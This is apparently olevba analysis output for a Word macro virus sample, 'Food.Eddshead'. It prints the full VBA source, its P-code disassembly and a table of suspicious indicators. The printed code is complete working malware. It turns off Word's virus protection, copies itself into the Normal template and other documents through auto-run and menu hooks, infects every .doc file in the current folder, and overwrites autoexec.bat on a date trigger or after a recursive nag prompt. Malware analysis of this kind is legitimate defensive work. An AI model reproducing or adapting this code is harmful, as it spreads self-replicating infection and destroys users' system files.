olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Edds.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Edds.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Edds.bas 
in file: Virus.MSWord.Edds.c - OLE stream: 'Macros/VBA/Edds'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    
Public Skip As Integer
    
    '   Food.Eddshead Macro Virus
    '   Coded by Eddshead ;)
    '   29th May 1998 ENGLAND
    '   Watch out, the next one will format your hard drive!
    
Sub Edds()
 
On Error Resume Next
With Options
    .ConfirmConversions = False
    .VirusProtection = False
    .SaveNormalPrompt = False
End With
ActiveDocument.ReadOnlyRecommended = False
If Day(Now()) = 4 Then Call nasty("C:\autoexec.bat")
z4593895613 = 0
Set vx8956459313 = MacroContainer
If vx8956459313 = NormalTemplate Then z4593895613 = 1
If z4593895613 = 1 Then fuck45938 = NormalTemplate.FullName Else fuck45938 = ActiveDocument.FullName
If z4593895613 = 1 Then ki89561 = ActiveDocument.FullName Else ki89561 = NormalTemplate.FullName
Application.OrganizerCopy Source:=fuck45938, Destination:=ki89561, Name:="Edds", Object:=wdOrganizerObjectProjectItems
If z4593895613 = 1 And Skip <> 1 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
If z4593895613 = 0 Then
     If NormalTemplate.Saved = False Then NormalTemplate.Save
     End If

fuckoff:
End Sub
Sub FileNew()
    On Error Resume Next
    Call Edds
Dialogs(wdDialogFileNew).Show
    Skip = 1
    Call Edds
End Sub
Sub viewvbcode()
' no no no no no no !
End Sub
Sub FileSave()
    On Error Resume Next
    Call Edds
     ActiveDocument.Save
End Sub
Sub FileClose()
    On Error Resume Next
    Call Edds
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    ActiveDocument.Close
End Sub
Sub ToolsOptions()
    On Error Resume Next
    Dialogs(wdDialogToolsOptions).Show
    Call Edds
End Sub
Sub EditFind()
    On Error Resume Next
    Dialogs(wdDialogEditFind).Show
    Call Edds
End Sub
Sub FileSaveAs()
    On Error Resume Next
    Call execute
    Dialogs(wdDialogFileSaveAs).Show
    Call Edds
End Sub
Sub FilePrint()
    On Error Resume Next
Dialogs(wdDialogFilePrint).Show
    Call Edds
End Sub
Sub FileExit()
    On Error Resume Next
    Call Edds
    If ActiveDocument.Saved = False Then ActiveDocument.Save
Application.WindowState = wdWindowStateMinimize
pName = CurDir & "\"
fName = Dir(pName & "*.doc", sAttr)
If (fName <> "") And ((fName <> ".") And (fName <> "..")) Then InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
Call Edds
Do While (fName <> "")
fName = Dir()
If (fName <> "") And _
((fName <> ".") And (fName <> "..")) Then
InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
    Call Edds
End If
Loop
    Application.Quit
End Sub
Sub AutoOpen()
    On Error Resume Next
    Call Edds
End Sub
Sub AutoExit()
    On Error Resume Next
    Call Edds
Application.WindowState = wdWindowStateMinimize
pName = CurDir & "\"
fName = Dir(pName & "*.doc", sAttr)
If (fName <> "") And ((fName <> ".") And (fName <> "..")) Then InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
Call Edds
Do While (fName <> "")
fName = Dir()
If (fName <> "") And _
((fName <> ".") And (fName <> "..")) Then
InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
    Call Edds
End If
Loop
End Sub
Sub AutoExec()
    On Error Resume Next
    Call Edds
End Sub
Sub AutoClose()
    On Error Resume Next
    Call Edds
End Sub
Sub nasty(strfile As String)
Dim hfile As Long
    On Error Resume Next
part1$ = "This should be your Autoexec.bat file"
part2$ = "But now, I'm afraid, it's just a text file"
part3$ = "That will teach you to feed me with fish"
part4$ = "STOP ALL NUCLEAR TESTING IN THE THIRD WORLD"
hfile = FreeFile
Open strfile For Output Access Write As hfile
Print #hfile, part1$
Print #hfile, part2$
Print #hfile, part3$
Print #hfile, part4$
Close hfile
End Sub

Sub execute()
On Error Resume Next
Randomize
Check = Int(Rnd * 10)
If Check = 3 Then Call payloaded
Return

End Sub
Sub toolsmacro()
Randomize
Dim selector
selector = Int((5 * Rnd) + 1)
If selector = 1 Then
Application.Quit SaveChanges:=False
Else
Call Edds
End If
End Sub

Sub payloaded()
On Error Resume Next
Dim myvalue

myvalue = InputBox("Hello! I'm Food.Eddshead, and I am hungry! If you want to continual using Word you must feed me. Be careful, some foods make me ill, and you don't want to make me angry - do you?", "Your computer is hungry ;)")
    If myvalue = "chips" Then FileSaveAs: End
    If myvalue = "fish" Then Call nasty("C:\autoexec.bat")
    If myvalue = "sausages" Then Call nasty("C:\autoexec.bat")
    If myvalue = "beef burgers" Then Call nasty("C:\autoexec.bat")
    If myvalue = "ham burgers" Then Call nasty("C:\autoexec.bat")
Call payloaded
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Edds.c
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1063 bytes
' Macros/VBA/Edds - 15362 bytes
' Line #0:
' Line #1:
' 	Dim (Public) 
' 	VarDefn Skip (As Integer)
' Line #2:
' Line #3:
' 	QuoteRem 0x0004 0x001C "   Food.Eddshead Macro Virus"
' Line #4:
' 	QuoteRem 0x0004 0x0017 "   Coded by Eddshead ;)"
' Line #5:
' 	QuoteRem 0x0004 0x0018 "   29th May 1998 ENGLAND"
' Line #6:
' 	QuoteRem 0x0004 0x0037 "   Watch out, the next one will format your hard drive!"
' Line #7:
' Line #8:
' 	FuncDefn (Sub Edds())
' Line #9:
' Line #10:
' 	OnError (Resume Next) 
' Line #11:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #12:
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' Line #13:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #14:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #15:
' 	EndWith 
' Line #16:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #17:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000F "C:\autoexec.bat"
' 	ArgsCall (Call) nasty 0x0001 
' 	EndIf 
' Line #18:
' 	LitDI2 0x0000 
' 	St z4593895613 
' Line #19:
' 	SetStmt 
' 	Ld MacroContainer 
' 	Set vx8956459313 
' Line #20:
' 	Ld vx8956459313 
' 	Ld NormalTemplate 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St z4593895613 
' 	EndIf 
' Line #21:
' 	Ld z4593895613 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	St fuck45938 
' 	Else 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	St fuck45938 
' 	EndIf 
' Line #22:
' 	Ld z4593895613 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	St ki89561 
' 	Else 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	St ki89561 
' 	EndIf 
' Line #23:
' 	Ld fuck45938 
' 	ParamNamed Source 
' 	Ld ki89561 
' 	ParamNamed Destination 
' 	LitStr 0x0004 "Edds"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #24:
' 	Ld z4593895613 
' 	LitDI2 0x0001 
' 	Eq 
' 	Ld Skip 
' 	LitDI2 0x0001 
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' 	EndIf 
' Line #25:
' 	Ld z4593895613 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #26:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #27:
' 	EndIfBlock 
' Line #28:
' Line #29:
' 	Label fuckoff 
' Line #30:
' 	EndSub 
' Line #31:
' 	FuncDefn (Sub FileNew())
' Line #32:
' 	OnError (Resume Next) 
' Line #33:
' 	ArgsCall (Call) Edds 0x0000 
' Line #34:
' 	Ld wdDialogFileNew 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #35:
' 	LitDI2 0x0001 
' 	St Skip 
' Line #36:
' 	ArgsCall (Call) Edds 0x0000 
' Line #37:
' 	EndSub 
' Line #38:
' 	FuncDefn (Sub viewvbcode())
' Line #39:
' 	QuoteRem 0x0000 0x0014 " no no no no no no !"
' Line #40:
' 	EndSub 
' Line #41:
' 	FuncDefn (Sub FileSave())
' Line #42:
' 	OnError (Resume Next) 
' Line #43:
' 	ArgsCall (Call) Edds 0x0000 
' Line #44:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #45:
' 	EndSub 
' Line #46:
' 	FuncDefn (Sub FileClose())
' Line #47:
' 	OnError (Resume Next) 
' Line #48:
' 	ArgsCall (Call) Edds 0x0000 
' Line #49:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #50:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #51:
' 	EndSub 
' Line #52:
' 	FuncDefn (Sub ToolsOptions())
' Line #53:
' 	OnError (Resume Next) 
' Line #54:
' 	Ld wdDialogToolsOptions 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #55:
' 	ArgsCall (Call) Edds 0x0000 
' Line #56:
' 	EndSub 
' Line #57:
' 	FuncDefn (Sub EditFind())
' Line #58:
' 	OnError (Resume Next) 
' Line #59:
' 	Ld wdDialogEditFind 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #60:
' 	ArgsCall (Call) Edds 0x0000 
' Line #61:
' 	EndSub 
' Line #62:
' 	FuncDefn (Sub FileSaveAs())
' Line #63:
' 	OnError (Resume Next) 
' Line #64:
' 	ArgsCall (Call) execute 0x0000 
' Line #65:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #66:
' 	ArgsCall (Call) Edds 0x0000 
' Line #67:
' 	EndSub 
' Line #68:
' 	FuncDefn (Sub FilePrint())
' Line #69:
' 	OnError (Resume Next) 
' Line #70:
' 	Ld wdDialogFilePrint 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #71:
' 	ArgsCall (Call) Edds 0x0000 
' Line #72:
' 	EndSub 
' Line #73:
' 	FuncDefn (Sub FileExit())
' Line #74:
' 	OnError (Resume Next) 
' Line #75:
' 	ArgsCall (Call) Edds 0x0000 
' Line #76:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #77:
' 	Ld wdWindowStateMinimize 
' 	Ld Application 
' 	MemSt WindowState 
' Line #78:
' 	Ld CurDir 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	St pName 
' Line #79:
' 	Ld pName 
' 	LitStr 0x0005 "*.doc"
' 	Concat 
' 	Ld sAttr 
' 	ArgsLd Dir 0x0002 
' 	St fName 
' Line #80:
' 	Ld fName 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	Ld fName 
' 	LitStr 0x0001 "."
' 	Ne 
' 	Paren 
' 	Ld fName 
' 	LitStr 0x0002 ".."
' 	Ne 
' 	Paren 
' 	And 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld pName 
' 	Ld fName 
' 	Concat 
' 	St InfectDoc 
' 	EndIf 
' Line #81:
' 	LineCont 0x0004 0D 00 00 00
' 	Ld InfectDoc 
' 	ParamNamed FileName 
' 	LitVarSpecial (False)
' 	ParamNamed ConfirmConversions 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnly 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitStr 0x0000 ""
' 	ParamNamed PasswordDocument 
' 	Ld Documents 
' 	ArgsMemCall Option 0x0005 
' Line #82:
' 	ArgsCall (Call) Edds 0x0000 
' Line #83:
' 	Ld fName 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	DoWhile 
' Line #84:
' 	ArgsLd Dir 0x0000 
' 	St fName 
' Line #85:
' 	LineCont 0x0004 07 00 00 00
' 	Ld fName 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	Ld fName 
' 	LitStr 0x0001 "."
' 	Ne 
' 	Paren 
' 	Ld fName 
' 	LitStr 0x0002 ".."
' 	Ne 
' 	Paren 
' 	And 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #86:
' 	Ld pName 
' 	Ld fName 
' 	Concat 
' 	St InfectDoc 
' Line #87:
' 	LineCont 0x0004 0D 00 00 00
' 	Ld InfectDoc 
' 	ParamNamed FileName 
' 	LitVarSpecial (False)
' 	ParamNamed ConfirmConversions 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnly 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitStr 0x0000 ""
' 	ParamNamed PasswordDocument 
' 	Ld Documents 
' 	ArgsMemCall Option 0x0005 
' Line #88:
' 	ArgsCall (Call) Edds 0x0000 
' Line #89:
' 	EndIfBlock 
' Line #90:
' 	Loop 
' Line #91:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #92:
' 	EndSub 
' Line #93:
' 	FuncDefn (Sub AutoOpen())
' Line #94:
' 	OnError (Resume Next) 
' Line #95:
' 	ArgsCall (Call) Edds 0x0000 
' Line #96:
' 	EndSub 
' Line #97:
' 	FuncDefn (Sub AutoExit())
' Line #98:
' 	OnError (Resume Next) 
' Line #99:
' 	ArgsCall (Call) Edds 0x0000 
' Line #100:
' 	Ld wdWindowStateMinimize 
' 	Ld Application 
' 	MemSt WindowState 
' Line #101:
' 	Ld CurDir 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	St pName 
' Line #102:
' 	Ld pName 
' 	LitStr 0x0005 "*.doc"
' 	Concat 
' 	Ld sAttr 
' 	ArgsLd Dir 0x0002 
' 	St fName 
' Line #103:
' 	Ld fName 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	Ld fName 
' 	LitStr 0x0001 "."
' 	Ne 
' 	Paren 
' 	Ld fName 
' 	LitStr 0x0002 ".."
' 	Ne 
' 	Paren 
' 	And 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld pName 
' 	Ld fName 
' 	Concat 
' 	St InfectDoc 
' 	EndIf 
' Line #104:
' 	LineCont 0x0004 0D 00 00 00
' 	Ld InfectDoc 
' 	ParamNamed FileName 
' 	LitVarSpecial (False)
' 	ParamNamed ConfirmConversions 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnly 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitStr 0x0000 ""
' 	ParamNamed PasswordDocument 
' 	Ld Documents 
' 	ArgsMemCall Option 0x0005 
' Line #105:
' 	ArgsCall (Call) Edds 0x0000 
' Line #106:
' 	Ld fName 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	DoWhile 
' Line #107:
' 	ArgsLd Dir 0x0000 
' 	St fName 
' Line #108:
' 	LineCont 0x0004 07 00 00 00
' 	Ld fName 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	Ld fName 
' 	LitStr 0x0001 "."
' 	Ne 
' 	Paren 
' 	Ld fName 
' 	LitStr 0x0002 ".."
' 	Ne 
' 	Paren 
' 	And 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #109:
' 	Ld pName 
' 	Ld fName 
' 	Concat 
' 	St InfectDoc 
' Line #110:
' 	LineCont 0x0004 0D 00 00 00
' 	Ld InfectDoc 
' 	ParamNamed FileName 
' 	LitVarSpecial (False)
' 	ParamNamed ConfirmConversions 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnly 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitStr 0x0000 ""
' 	ParamNamed PasswordDocument 
' 	Ld Documents 
' 	ArgsMemCall Option 0x0005 
' Line #111:
' 	ArgsCall (Call) Edds 0x0000 
' Line #112:
' 	EndIfBlock 
' Line #113:
' 	Loop 
' Line #114:
' 	EndSub 
' Line #115:
' 	FuncDefn (Sub AutoExec())
' Line #116:
' 	OnError (Resume Next) 
' Line #117:
' 	ArgsCall (Call) Edds 0x0000 
' Line #118:
' 	EndSub 
' Line #119:
' 	FuncDefn (Sub AutoClose())
' Line #120:
' 	OnError (Resume Next) 
' Line #121:
' 	ArgsCall (Call) Edds 0x0000 
' Line #122:
' 	EndSub 
' Line #123:
' 	FuncDefn (Sub nasty(strfile As String))
' Line #124:
' 	Dim 
' 	VarDefn hfile (As Long)
' Line #125:
' 	OnError (Resume Next) 
' Line #126:
' 	LitStr 0x0025 "This should be your Autoexec.bat file"
' 	St part1$ 
' Line #127:
' 	LitStr 0x002A "But now, I'm afraid, it's just a text file"
' 	St part2$ 
' Line #128:
' 	LitStr 0x0028 "That will teach you to feed me with fish"
' 	St part3$ 
' Line #129:
' 	LitStr 0x002B "STOP ALL NUCLEAR TESTING IN THE THIRD WORLD"
' 	St part4$ 
' Line #130:
' 	Ld Friend 
' 	St hfile 
' Line #131:
' 	Ld strfile 
' 	Ld hfile 
' 	LitDefault 
' 	Open (For Output Access Write)
' Line #132:
' 	Ld hfile 
' 	Sharp 
' 	PrintChan 
' 	Ld part1$ 
' 	PrintItemNL 
' Line #133:
' 	Ld hfile 
' 	Sharp 
' 	PrintChan 
' 	Ld part2$ 
' 	PrintItemNL 
' Line #134:
' 	Ld hfile 
' 	Sharp 
' 	PrintChan 
' 	Ld part3$ 
' 	PrintItemNL 
' Line #135:
' 	Ld hfile 
' 	Sharp 
' 	PrintChan 
' 	Ld part4$ 
' 	PrintItemNL 
' Line #136:
' 	Ld hfile 
' 	Close 0x0001 
' Line #137:
' 	EndSub 
' Line #138:
' Line #139:
' 	FuncDefn (Sub execute())
' Line #140:
' 	OnError (Resume Next) 
' Line #141:
' 	ArgsCall Read 0x0000 
' Line #142:
' 	Ld Rnd 
' 	LitDI2 0x000A 
' 	Mul 
' 	FnInt 
' 	St Check 
' Line #143:
' 	Ld Check 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) payloaded 0x0000 
' 	EndIf 
' Line #144:
' 	Return 
' Line #145:
' Line #146:
' 	EndSub 
' Line #147:
' 	FuncDefn (Sub toolsmacro())
' Line #148:
' 	ArgsCall Read 0x0000 
' Line #149:
' 	Dim 
' 	VarDefn selector
' Line #150:
' 	LitDI2 0x0005 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St selector 
' Line #151:
' 	Ld selector 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #152:
' 	LitVarSpecial (False)
' 	ParamNamed SaveChanges 
' 	Ld Application 
' 	ArgsMemCall Quit 0x0001 
' Line #153:
' 	ElseBlock 
' Line #154:
' 	ArgsCall (Call) Edds 0x0000 
' Line #155:
' 	EndIfBlock 
' Line #156:
' 	EndSub 
' Line #157:
' Line #158:
' 	FuncDefn (Sub payloaded())
' Line #159:
' 	OnError (Resume Next) 
' Line #160:
' 	Dim 
' 	VarDefn myvalue
' Line #161:
' Line #162:
' 	LitStr 0x00B2 "Hello! I'm Food.Eddshead, and I am hungry! If you want to continual using Word you must feed me. Be careful, some foods make me ill, and you don't want to make me angry - do you?"
' 	LitStr 0x001A "Your computer is hungry ;)"
' 	ArgsLd InputBox 0x0002 
' 	St myvalue 
' Line #163:
' 	Ld myvalue 
' 	LitStr 0x0005 "chips"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall FileSaveAs 0x0000 
' 	BoS 0x0000 
' 	End 
' 	EndIf 
' Line #164:
' 	Ld myvalue 
' 	LitStr 0x0004 "fish"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000F "C:\autoexec.bat"
' 	ArgsCall (Call) nasty 0x0001 
' 	EndIf 
' Line #165:
' 	Ld myvalue 
' 	LitStr 0x0008 "sausages"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000F "C:\autoexec.bat"
' 	ArgsCall (Call) nasty 0x0001 
' 	EndIf 
' Line #166:
' 	Ld myvalue 
' 	LitStr 0x000C "beef burgers"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000F "C:\autoexec.bat"
' 	ArgsCall (Call) nasty 0x0001 
' 	EndIf 
' Line #167:
' 	Ld myvalue 
' 	LitStr 0x000B "ham burgers"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000F "C:\autoexec.bat"
' 	ArgsCall (Call) nasty 0x0001 
' 	EndIf 
' Line #168:
' 	ArgsCall (Call) payloaded 0x0000 
' Line #169:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
|IOC       |Autoexec.bat        |Executable file name                         |
|Base64    |~+!                 |fish                                         |
|String    |                    |                                             |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

